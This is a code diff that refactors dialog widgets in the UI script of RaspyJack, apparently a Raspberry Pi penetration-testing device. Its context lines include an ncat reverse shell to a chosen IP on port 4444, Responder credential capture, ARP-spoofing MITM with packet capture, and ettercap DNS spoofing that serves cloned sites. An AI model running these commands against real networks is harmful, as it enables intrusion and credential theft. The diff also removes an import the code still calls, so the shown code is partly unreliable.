@@ -13,6 +13,14 @@ from functools import partial
 import time
 import sys
 import textwrap
+from ui.widgets import (
+    WidgetContext,
+    dialog,
+    dialog_info,
+    yn_dialog,
+    ip_value_picker,
+    color_picker,  # newly added color picker convenience function
+)
 
 # https://www.waveshare.com/wiki/File:1.44inch-LCD-HAT-Code.7z
 
@@ -29,13 +37,11 @@ try:
     from wifi.raspyjack_integration import (
         get_best_interface, 
         get_interface_ip, 
-        get_interface_network,
         get_nmap_target_network,
         get_mitm_interface,
         get_responder_interface,
         get_dns_spoof_ip,
-        show_interface_info,
-        set_raspyjack_interface
+        show_interface_info
     )
     WIFI_AVAILABLE = True
     print("✅ WiFi integration loaded - dual interface support enabled")
@@ -307,7 +313,7 @@ class template():
 ####### Simple methods #######
 ### Get any button press ###
 def getButton():
-    while 1:
+    while True:
         for item, pin in gpio_config.pins.items():
             val = GPIO.input(pin)
             if item in EDGE_BUTTONS:
@@ -348,7 +354,7 @@ def Leave(poweroff: bool = False) -> None:
 
 def Restart():
     print("Restarting the UI!")
-    Dialog("Restarting!", False)
+    dialog(_widget_context, "Restarting!", False)
     arg = ["-n","-5",os.sys.executable] + sys.argv
     os.execv(os.popen("whereis nice").read().split(" ")[1], arg)
     Leave()
@@ -473,54 +479,13 @@ def reload_plugins():
 
 ####### Drawing functions #######
 
-### Simple message box ###
-# (Text, Wait for confirmation)  #
-def Dialog(a, wait=True):
-    draw.rectangle([7, 35, 120, 95], fill="#ADADAD")
-    draw.text((35 - len(a), 45), a, fill="#000000")
-    draw.rectangle([45, 65, 70, 80], fill="#FF0000")
+# Global widget context - will be initialized in main()
+_widget_context = None
 
-    draw.text((50, 68), "OK", fill=color.selected_text)
-    if wait:
-        time.sleep(0.25)
-        getButton()
+####### Drawing functions #######
 
-def Dialog_info(a, wait=True):
-    draw.rectangle([3, 14, 124, 124], fill="#00A321")
-    draw.text((35 - len(a), 45), a, fill="#000000")
-
-### Yes or no dialog ###
-# (b is second text line)
-def YNDialog(a="Are you sure?", y="Yes", n="No",b=""):
-    draw.rectangle([7, 35, 120, 95], fill="#ADADAD")
-    draw.text((35 - len(a), 40), a, fill="#000000")
-    draw.text((12, 52), b, fill="#000000")
-    time.sleep(0.25)
-    answer = False
-    while 1:
-        render_color = "#000000"
-        render_bg_color = "#ADADAD"
-        if answer:
-            render_bg_color = "#FF0000"
-            render_color = color.selected_text
-        draw.rectangle([15, 65, 45, 80], fill=render_bg_color)
-        draw.text((20, 68), y, fill=render_color)
-
-        render_color = "#000000"
-        render_bg_color = "#ADADAD"
-        if not answer:
-            render_bg_color = "#FF0000"
-            render_color = color.selected_text
-        draw.rectangle([76, 65, 106, 80], fill=render_bg_color)
-        draw.text((86, 68), n, fill=render_color)
-
-        button = getButton()
-        if button == "KEY_LEFT_PIN" or button == "KEY1_PIN":
-            answer = True
-        elif button == "KEY_RIGHT_PIN" or button == "KEY3_PIN":
-            answer = False
-        elif button == "KEY2_PIN" or button == "KEY_PRESS_PIN":
-            return answer
+# Global widget context - will be initialized in main()
+_widget_context = None
 
 ### Scroll through text pictures ###
 # 8 lines of text on screen at once
@@ -705,115 +670,26 @@ def GetMenuString(inlist, duplicates=False):
 
 ### Draw up down triangles ###
 color = template()
-def DrawUpDown(value, offset=0, up=False,down=False, render_color=color.text):
-    draw.polygon([(offset, 53), (10 + offset, 35), (20+offset, 53)],
-        outline=color.gamepad, fill=(color.background, color.gamepad_fill)[up])
-    draw.polygon([(10+offset, 93), (20+offset, 75), (offset, 75)],
-        outline=color.gamepad, fill=(color.background, color.gamepad_fill)[down])
 
-    draw.rectangle([( offset + 2, 60),(offset+30, 70)], fill=color.background)
-    draw.text((offset + 2, 60), str(value) , fill=render_color)
-
-
-### Screen for selecting RGB color ###
-def GetColor(final_color="#000000"):
-    color.DrawMenuBackground()
-    time.sleep(0.4)
-    i_rgb = 0
-    render_offset = default.updown_pos
-    desired_color = list(int(final_color[i:i+2], 16) for i in (1, 3, 5))
-
-    while GPIO.input(gpio_config.key_press_pin):
-        render_up = False
-        render_down = False
-        final_color='#%02x%02x%02x' % (desired_color[0],desired_color[1],desired_color[2])
-
-        draw.rectangle([(default.start_text[0]-5, 1+ default.start_text[1] + default.text_gap * 0),(120, default.start_text[1] + default.text_gap * 0 + 10)], fill=final_color)
-        draw.rectangle([(default.start_text[0]-5, 3+ default.start_text[1] + default.text_gap * 6),(120, default.start_text[1] + default.text_gap * 6 + 12)], fill=final_color)
-
-        DrawUpDown(desired_color[0],render_offset[0],render_up,render_down,(color.text, color.selected_text)[i_rgb == 0])
-        DrawUpDown(desired_color[1],render_offset[1],render_up,render_down,(color.text, color.selected_text)[i_rgb == 1])
-        DrawUpDown(desired_color[2],render_offset[2],render_up,render_down,(color.text, color.selected_text)[i_rgb == 2])
-
-        button = getButton()
-        if button == "KEY_LEFT_PIN":
-            i_rgb = i_rgb - 1
-            time.sleep(0.1)
-        elif button == "KEY_RIGHT_PIN":
-            i_rgb = i_rgb + 1
-            time.sleep(0.1)
-        elif button == "KEY_UP_PIN":
-            desired_color[i_rgb] = desired_color[i_rgb] + 5
-            render_up = True
-        elif button == "KEY_DOWN_PIN":
-            desired_color[i_rgb] = desired_color[i_rgb] - 5
-            render_down = True
-        elif button == "KEY1_PIN":
-            desired_color[i_rgb] = desired_color[i_rgb] + 1
-            render_up = True
-        elif button == "KEY3_PIN":
-            desired_color[i_rgb] = desired_color[i_rgb] - 1
-            render_down = True
-        elif button == "KEY_PRESS_PIN":
-            break
-
-        if i_rgb > 2:
-            i_rgb = 0
-        elif i_rgb < 0:
-            i_rgb = 2
-
-        if desired_color[i_rgb] > 255:
-            desired_color[i_rgb] = 0
-        elif desired_color[i_rgb] < 0:
-            desired_color[i_rgb] = 255
-
-        DrawUpDown(desired_color[i_rgb],render_offset[i_rgb],render_up,render_down,color.selected_text)
-        time.sleep(0.1)
-    return final_color
-
-### Set color based on indexes (not reference pls help)###
-def SetColor(a):
+### Set a color using ColorPicker widget ###
+def SetColor(a: int) -> None:
+    """Open the color picker widget for theme color index 'a'."""
     m.which = m.which + "1"
-    c = GetColor(color.Get(a))
-    if YNDialog(a="Set color to?", y="Yes", n="No",b=("    " + c) ):
-        color.Set(a, c)
-        Dialog("   Done!")
-    m.which = m.which[:-1]
-
-### Select a single value###
-def GetIpValue(prefix):
-    value = 1
-    render_offset = default.updown_pos
-    color.DrawMenuBackground()
-    time.sleep(0.4)
-    while GPIO.input(gpio_config.key_press_pin):
-        render_up = False
-        render_down = False
-
-        draw.rectangle([(default.start_text[0]-5, 1+ default.start_text[1] + default.text_gap * 0),(120, default.start_text[1] + default.text_gap * 5)], fill=color.background)
-        DrawUpDown(value,render_offset[2],render_up,render_down,color.selected_text)
-        draw.text(( 5,60), f"IP:{prefix}.", fill=color.selected_text)
-
-        button = getButton()
-        if button == "KEY_UP_PIN":
-            value = min(255, value + 1)
-            render_up = True
-        elif button == "KEY_DOWN_PIN":
-            value = max(0, value - 1)
-            render_down = True
-        elif button == "KEY1_PIN":
-            value = min(255, value + 5)
-            render_up = True
-        elif button == "KEY3_PIN":
-            value = max(0, value - 5)
-            render_down = True
-        elif button == "KEY_PRESS_PIN":
-            break
-
-        DrawUpDown(value,render_offset[2],render_up,render_down,color.selected_text)
-        time.sleep(0.1)
-    return value
-
+    try:
+        initial = color.Get(a)
+        picked = color_picker(_widget_context, initial_color=initial)
+        if yn_dialog(
+            _widget_context,
+            question="Set color to?",
+            yes_text="Yes",
+            no_text="No",
+            second_line=("    " + picked),
+        ):
+            color.Set(a, picked)
+            dialog(_widget_context, "   Done!")
+    finally:
+        # Always pop submenu marker
+        m.which = m.which[:-1]
 
 
 ### Gamepad ###
@@ -1065,7 +941,7 @@ def Explorer(path="/",extensions=""):
                 path = path + output
                 path = (path + "/",path)[path[-1] == "/"]
             else:
-                if YNDialog("Open?","Yes","No",output[:10]):
+                if yn_dialog(_widget_context, question="Open?", yes_text="Yes", no_text="No", second_line=output[:10]):
                     return path + output
         else:
             break
@@ -1126,7 +1002,7 @@ def ImageExplorer() -> None:
             if not path.endswith("/"):
                 path += "/"
         else:                                    # prévisualiser un fichier image
-            if YNDialog("Open?", "Yes", "No", output[:10]):
+            if yn_dialog(_widget_context, question="Open?", yes_text="Yes", no_text="No", second_line=output[:10]):
                 full_img = os.path.join(path, output)
                 with Image.open(full_img) as img:
                     image.paste(img.resize((128, 128)))
@@ -1149,14 +1025,14 @@ def run_scan(label: str, nmap_args: list[str]):
         except Exception:
             pass
 
-    Dialog_info(f"      {label}\n        Running\n      wait please...", wait=True)
+    dialog_info(_widget_context, f"      {label}\n        Running\n      wait please...", wait=True)
 
     # Get target network from best available interface
     interface = get_best_interface()
     ip_with_mask = get_nmap_target_network(interface)
     
     if not ip_with_mask:
-        Dialog_info("Network Error\nNo interface available", wait=True)
+        dialog_info(_widget_context, "Network Error\nNo interface available", wait=True)
         return
 
     ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
@@ -1181,7 +1057,7 @@ def run_scan(label: str, nmap_args: list[str]):
         except Exception:
             pass
 
-    Dialog_info(f"      {label}\n      Finished !!!\n   Interface: {interface}", wait=True)
+    dialog_info(_widget_context, f"      {label}\n      Finished !!!\n   Interface: {interface}", wait=True)
     time.sleep(2)
 
 
@@ -1218,15 +1094,15 @@ def defaut_Reverse():
         default_ip = default_ip_bytes.decode('utf-8').strip()
         default_ip_parts = default_ip.split(".")
         default_ip_prefix = ".".join(default_ip_parts[:3])
-        new_value = GetIpValue(default_ip_prefix)
+        new_value = ip_value_picker(_widget_context, default_ip_prefix, initial_value=1)
         target_ip = f"{default_ip_prefix}.{new_value}"
         nc_command = ['ncat', target_ip, '4444', '-e', '/bin/bash']
         print(f"Reverse launched on {target_ip} via {interface}!!!!!")
         process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
-        Dialog_info(f"   Reverse launched !\n   on {target_ip}\n   via {interface}", wait=True)
+        dialog_info(_widget_context, f"   Reverse launched !\n   on {target_ip}\n   via {interface}", wait=True)
         time.sleep(2)
     except Exception as e:
-        Dialog_info(f"Reverse Error\nInterface: {interface}\nNo network?", wait=True)
+        dialog_info(_widget_context, f"Reverse Error\nInterface: {interface}\nNo network?", wait=True)
         time.sleep(2)
 
 def remote_Reverse():
@@ -1239,18 +1115,18 @@ def responder_on():
     check_responder_process = os.popen(check_responder_command).read().strip()
     if check_responder_process:
         subprocess.check_call(check_responder_command, shell=True)
-        Dialog_info(" Already running !!!!", wait=True)
+        dialog_info(_widget_context, " Already running !!!!", wait=True)
         time.sleep(2)
     else:
         # Get best interface for Responder
         interface = get_responder_interface()
         os.system(f'python3 /root/Raspyjack/Responder/Responder.py -Q -I {interface} &')
-        Dialog_info(f"     Responder \n      started !!\n   Interface: {interface}", wait=True)
+        dialog_info(_widget_context, f"     Responder \n      started !!\n   Interface: {interface}", wait=True)
         time.sleep(2)
 
 def responder_off():
     os.system("killResponder=$(ps aux | grep Responder|grep -v 'grep'|awk '{print $2}')&&kill -9 $killResponder")
-    Dialog_info("   Responder \n     stopped !!", wait=True)
+    dialog_info(_widget_context, "   Responder \n     stopped !!", wait=True)
     time.sleep(2)
 
 
@@ -1266,7 +1142,7 @@ def get_local_network():
 
 def Start_MITM():
     safe_kill("arpspoof", "tcpdump")
-    Dialog_info("                    Lancement\n                  MITM & Sniff\n                   En cours\n                  Patientez...", wait=True)
+    dialog_info(_widget_context, "                    Lancement\n                  MITM & Sniff\n                   En cours\n                  Patientez...", wait=True)
     
     # Get best interface for MITM attack
     interface = get_mitm_interface()
@@ -1306,11 +1182,11 @@ def Start_MITM():
         os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
         tcpdump_process = subprocess.Popen(["tcpdump", "-i", interface, "-w", pcap_file], stdout=subprocess.PIPE)
         tcpdump_process.stdout.close()
-        Dialog_info(f" MITM & Sniff\n Sur {len(hosts)-1} hosts !!!\n Interface: {interface}", wait=True)
+        dialog_info(_widget_context, f" MITM & Sniff\n Sur {len(hosts)-1} hosts !!!\n Interface: {interface}", wait=True)
         time.sleep(8)
     else:
         print("[-] No hosts found on network.")
-        Dialog_info("  ERREUR\nAucun hote.. ", wait=True)
+        dialog_info(_widget_context, "  ERREUR\nAucun hote.. ", wait=True)
         time.sleep(2)
 
 def Stop_MITM():
@@ -1318,7 +1194,7 @@ def Stop_MITM():
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     time.sleep(2)
     status_bar.set_temp_status("(MITM stopped)", ttl=5)
-    Dialog_info("    MITM & Sniff\n     stopped !!!", wait=True)
+    dialog_info(_widget_context, "    MITM & Sniff\n     stopped !!!", wait=True)
     time.sleep(2)
 
 
@@ -1329,7 +1205,7 @@ def spoof_site(name: str):
     global site_spoof
     site_spoof = name
 
-    Dialog_info(f"    Spoofing sur\n    {name} !!!", wait=True)
+    dialog_info(_widget_context, f"    Spoofing sur\n    {name} !!!", wait=True)
     time.sleep(2)
 
     subprocess.run("pkill -f 'php'", shell=True)   # stoppe les instances PHP
@@ -1362,7 +1238,7 @@ def Start_DNSSpoofing():
     current_ip = get_dns_spoof_ip(interface)
     
     if not current_ip:
-        Dialog_info("DNS Spoof Error\nNo IP available", wait=True)
+        dialog_info(_widget_context, "DNS Spoof Error\nNo IP available", wait=True)
         return
 
 # Escape special characters in the IP address for the sed command
@@ -1385,7 +1261,7 @@ def Start_DNSSpoofing():
 # Commands executed in the background
     website_command = f"cd /root/Raspyjack/DNSSpoof/sites/{site_spoof} && php -S 0.0.0.0:80"
     ettercap_command = f"ettercap -Tq -M arp:remote -P dns_spoof -i {interface}"
-    Dialog_info(f"    DNS Spoofing\n   {site_spoof}  started !!!\n Interface: {interface}", wait=True)
+    dialog_info(_widget_context, f"    DNS Spoofing\n   {site_spoof}  started !!!\n Interface: {interface}", wait=True)
     time.sleep(2)
 
 # Execution of background commands
@@ -1398,23 +1274,23 @@ def Stop_DNSSpoofing():
     subprocess.run("pkill -f 'php'", shell=True)
     subprocess.run("pkill -f 'ettercap'", shell=True)
 
-    Dialog_info("    DNS Spoofing\n     stopped !!!", wait=True)
+    dialog_info(_widget_context, "    DNS Spoofing\n     stopped !!!", wait=True)
     time.sleep(2)
 
 # WiFi Management Functions
 def launch_wifi_manager():
     """Launch the FAST WiFi interface."""
     if not WIFI_AVAILABLE:
-        Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)
+        dialog_info(_widget_context, "WiFi system not found\nRun wifi_manager_payload", wait=True)
         return
     
-    Dialog_info("Loading FAST WiFi\nSwitcher...", wait=True)
+    dialog_info(_widget_context, "Loading FAST WiFi\nSwitcher...", wait=True)
     exec_payload("fast_wifi_switcher.py")
 
 def show_interface_info():
     """Show detailed interface information."""
     if not WIFI_AVAILABLE:
-        Dialog_info("WiFi system not found", wait=True)
+        dialog_info(_widget_context, "WiFi system not found", wait=True)
         return
         
     try:
@@ -1443,12 +1319,12 @@ def show_interface_info():
         GetMenuString(info_lines)
         
     except Exception as e:
-        Dialog_info(f"Interface Info Error\n{str(e)[:20]}", wait=True)
+        dialog_info(_widget_context, f"Interface Info Error\n{str(e)[:20]}", wait=True)
 
 def switch_interface_menu():
     """Show interface switching menu with actual switching capability."""
     if not WIFI_AVAILABLE:
-        Dialog_info("WiFi system not found", wait=True)
+        dialog_info(_widget_context, "WiFi system not found", wait=True)
         return
         
     try:
@@ -1465,7 +1341,7 @@ def switch_interface_menu():
         wifi_interfaces = list_wifi_interfaces_with_status()
         
         if not wifi_interfaces:
-            Dialog_info("No WiFi interfaces\nfound!", wait=True)
+            dialog_info(_widget_context, "No WiFi interfaces\nfound!", wait=True)
             return
         
         # Create menu with interface status  
@@ -1489,23 +1365,23 @@ def switch_interface_menu():
                 selected_iface = parts[1]  # Get the wlan0/wlan1 part
                 
                 if selected_iface.startswith('wlan'):
-                    Dialog_info(f"Switching to\n{selected_iface}\nConfiguring routes...", wait=True)
+                    dialog_info(_widget_context, f"Switching to\n{selected_iface}\nConfiguring routes...", wait=True)
                     
                     # Actually perform the switch
                     success = set_raspyjack_interface(selected_iface)
                     
                     if success:
-                        Dialog_info(f"✓ SUCCESS!\nRaspyJack now using\n{selected_iface}\nAll tools updated", wait=True)
+                        dialog_info(_widget_context, f"✓ SUCCESS!\nRaspyJack now using\n{selected_iface}\nAll tools updated", wait=True)
                     else:
-                        Dialog_info(f"✗ FAILED!\nCould not switch to\n{selected_iface}\nCheck connection", wait=True)
+                        dialog_info(_widget_context, f"✗ FAILED!\nCould not switch to\n{selected_iface}\nCheck connection", wait=True)
         
     except Exception as e:
-        Dialog_info(f"Switch Error\n{str(e)[:20]}", wait=True)
+        dialog_info(_widget_context, f"Switch Error\n{str(e)[:20]}", wait=True)
 
 def show_routing_status():
     """Show current routing status."""
     if not WIFI_AVAILABLE:
-        Dialog_info("WiFi system not found", wait=True)
+        dialog_info(_widget_context, "WiFi system not found", wait=True)
         return
         
     try:
@@ -1535,12 +1411,12 @@ def show_routing_status():
         GetMenuString(info_lines)
         
     except Exception as e:
-        Dialog_info(f"Routing Error\n{str(e)[:20]}", wait=True)
+        dialog_info(_widget_context, f"Routing Error\n{str(e)[:20]}", wait=True)
 
 def switch_to_wifi():
     """Switch system to use WiFi as primary interface."""
     if not WIFI_AVAILABLE:
-        Dialog_info("WiFi system not found", wait=True)
+        dialog_info(_widget_context, "WiFi system not found", wait=True)
         return
         
     try:
@@ -1551,57 +1427,57 @@ def switch_to_wifi():
         wifi_interfaces = [iface for iface in interfaces if iface.startswith('wlan')]
         
         if not wifi_interfaces:
-            Dialog_info("No WiFi interfaces\nfound", wait=True)
+            dialog_info(_widget_context, "No WiFi interfaces\nfound", wait=True)
             return
         
         # Use first available WiFi interface
         wifi_iface = wifi_interfaces[0]
-        Dialog_info(f"Switching to WiFi\n{wifi_iface}\nPlease wait...", wait=True)
+        dialog_info(_widget_context, f"Switching to WiFi\n{wifi_iface}\nPlease wait...", wait=True)
         
         success = ensure_interface_default(wifi_iface)
         
         if success:
-            Dialog_info(f"✓ Switched to WiFi\n{wifi_iface}\nAll tools use WiFi", wait=True)
+            dialog_info(_widget_context, f"✓ Switched to WiFi\n{wifi_iface}\nAll tools use WiFi", wait=True)
         else:
-            Dialog_info(f"✗ Switch failed\nCheck WiFi connection", wait=True)
+            dialog_info(_widget_context, f"✗ Switch failed\nCheck WiFi connection", wait=True)
             
     except Exception as e:
-        Dialog_info(f"WiFi Switch Error\n{str(e)[:20]}", wait=True)
+        dialog_info(_widget_context, f"WiFi Switch Error\n{str(e)[:20]}", wait=True)
 
 def switch_to_ethernet():
     """Switch system to use Ethernet as primary interface."""
     if not WIFI_AVAILABLE:
-        Dialog_info("WiFi system not found", wait=True)
+        dialog_info(_widget_context, "WiFi system not found", wait=True)
         return
         
     try:
         from wifi.raspyjack_integration import ensure_interface_default
         
-        Dialog_info("Switching to Ethernet\neth0\nPlease wait...", wait=True)
+        dialog_info(_widget_context, "Switching to Ethernet\neth0\nPlease wait...", wait=True)
         
         success = ensure_interface_default("eth0")
         
         if success:
-            Dialog_info("✓ Switched to Ethernet\neth0\nAll tools use ethernet", wait=True)
+            dialog_info(_widget_context, "✓ Switched to Ethernet\neth0\nAll tools use ethernet", wait=True)
         else:
-            Dialog_info("✗ Switch failed\nCheck ethernet connection", wait=True)
+            dialog_info(_widget_context, "✗ Switch failed\nCheck ethernet connection", wait=True)
             
     except Exception as e:
-        Dialog_info(f"Ethernet Switch Error\n{str(e)[:20]}", wait=True)
+        dialog_info(_widget_context, f"Ethernet Switch Error\n{str(e)[:20]}", wait=True)
 
 def launch_interface_switcher():
     """Launch the interface switcher payload."""
     if not WIFI_AVAILABLE:
-        Dialog_info("WiFi system not found", wait=True)
+        dialog_info(_widget_context, "WiFi system not found", wait=True)
         return
     
-    Dialog_info("Loading Interface\nSwitcher...", wait=True)
+    dialog_info(_widget_context, "Loading Interface\nSwitcher...", wait=True)
     exec_payload("interface_switcher_payload.py")
 
 def quick_wifi_toggle():
     """FAST toggle between wlan0 and wlan1 - immediate switching."""
     if not WIFI_AVAILABLE:
-        Dialog_info("WiFi system not found", wait=True)
+        dialog_info(_widget_context, "WiFi system not found", wait=True)
         return
         
     try:
@@ -1621,18 +1497,18 @@ def quick_wifi_toggle():
             # Default to wlan1 if not using either
             target = 'wlan1'
         
-        Dialog_info(f"FAST SWITCH:\n{current} -> {target}\nSwitching now...", wait=True)
+        dialog_info(_widget_context, f"FAST SWITCH:\n{current} -> {target}\nSwitching now...", wait=True)
         
         # IMMEDIATE switch with force
         success = set_raspyjack_interface(target)
         
         if success:
-            Dialog_info(f"✓ SWITCHED!\n{target} active\n\nAll tools now\nuse {target}", wait=True)
+            dialog_info(_widget_context, f"✓ SWITCHED!\n{target} active\n\nAll tools now\nuse {target}", wait=True)
         else:
-            Dialog_info(f"✗ FAILED!\n{target} not ready\nCheck connection", wait=True)
+            dialog_info(_widget_context, f"✗ FAILED!\n{target} not ready\nCheck connection", wait=True)
             
     except Exception as e:
-        Dialog_info(f"Error: {str(e)[:20]}", wait=True)
+        dialog_info(_widget_context, f"Error: {str(e)[:20]}", wait=True)
 
 
 def list_payloads():
@@ -1702,10 +1578,10 @@ def exec_payload(filename: str) -> None:
 
     # --- Validate payload existence ---
     if is_py_payload and not os.path.isfile(full_path):
-        Dialog_info(f"Payload script not found:\n{filename}", wait=True)
+        dialog_info(_widget_context, f"Payload script not found:\n{filename}", wait=True)
         return
     elif is_dir_payload and not (os.path.isdir(full_path) and 'payload.sh' in os.listdir(full_path)):
-        Dialog_info(f"Payload directory not found\nor missing payload.sh:\n{filename}", wait=True)
+        dialog_info(_widget_context, f"Payload directory not found\nor missing payload.sh:\n{filename}", wait=True)
         return
 
     print(f"[PAYLOAD] ► Starting: {filename}")
@@ -1867,7 +1743,7 @@ class DisposableMenu:
             [" Show Interface Info", show_interface_info],  
             [" Route Control", "awr"],
         ) if WIFI_AVAILABLE else (
-            [" WiFi Not Available", lambda: Dialog_info("WiFi system not found\nRun wifi_manager_payload", wait=True)],
+            [" WiFi Not Available", lambda: dialog_info(_widget_context, "WiFi system not found\nRun wifi_manager_payload", wait=True)],
         ),
 
         "awr": (
@@ -1925,7 +1801,7 @@ class DisposableMenu:
             entries.append([f" [{'x' if cfg[name].get('enabled') else ' '}] {name}", _make_toggle(name)])
         # Save & Restart item
         def _save_restart():
-            Dialog_info(" Restarting UI\n  for plugins", wait=True)
+            dialog_info(_widget_context, " Restarting UI\n  for plugins", wait=True)
             time.sleep(0.5)
             Restart()
         entries.append([" Save & Restart", _save_restart])
@@ -2155,6 +2031,19 @@ def toggle_view_mode():
 
 
 def main():
+    global _widget_context
+    
+    # Initialize widget context
+    _widget_context = WidgetContext(
+        draw=draw,
+        lcd=LCD,
+        image=image,
+        color_scheme=color,
+        get_button_func=getButton,
+        fonts={'default': text_font, 'icon': icon_font},
+        default_settings=default
+    )
+    
     # Draw background once
     color.DrawMenuBackground()
     color.DrawBorder()
@@ -2221,14 +2110,15 @@ font = text_font
 ### Defining GPIO configuration ###
 from gpio_config import gpio_config
 
-EDGE_BUTTONS = [
-    gpio_config.key1_pin,
-    gpio_config.key2_pin,
-    gpio_config.key3_pin,
-    gpio_config.key_press_pin,
-    gpio_config.key_left_pin,
-    gpio_config.key_right_pin
-]
+# Edge-detected logical buttons.
+EDGE_BUTTONS = {
+    "KEY1_PIN",
+    "KEY2_PIN",
+    "KEY3_PIN",
+    "KEY_PRESS_PIN",
+    "KEY_LEFT_PIN",
+    "KEY_RIGHT_PIN",
+}
 
 _button_prev = {}
 LoadConfig()
